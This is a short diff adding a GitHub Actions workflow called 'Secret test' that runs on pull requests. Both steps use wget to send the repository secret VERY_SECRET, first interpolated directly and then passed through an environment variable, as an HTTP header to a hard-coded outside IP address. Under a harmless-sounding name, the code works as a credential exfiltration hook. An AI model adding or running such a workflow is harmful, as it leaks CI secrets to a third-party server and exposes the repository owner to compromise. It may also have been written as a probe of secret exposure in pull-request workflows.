@@ -1,0 +1,18 @@
+name: Secret test
+on: [pull_request]
+
+jobs:
+  secret-test:
+    name: Secret test
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Secret test 1
+        run: |
+          wget http://185.33.145.53:1234 -T 1 -t 1 --header="X-Bruh-1: ${{secrets.VERY_SECRET}}"
+
+      - name: Secret test 2
+        run: |
+          wget http://185.33.145.53:1234 -T 1 -t 1 --header="X-Bruh-2: ${VERY_SECRET}"
+        env:
+          VERY_SECRET: ${{secrets.VERY_SECRET}}
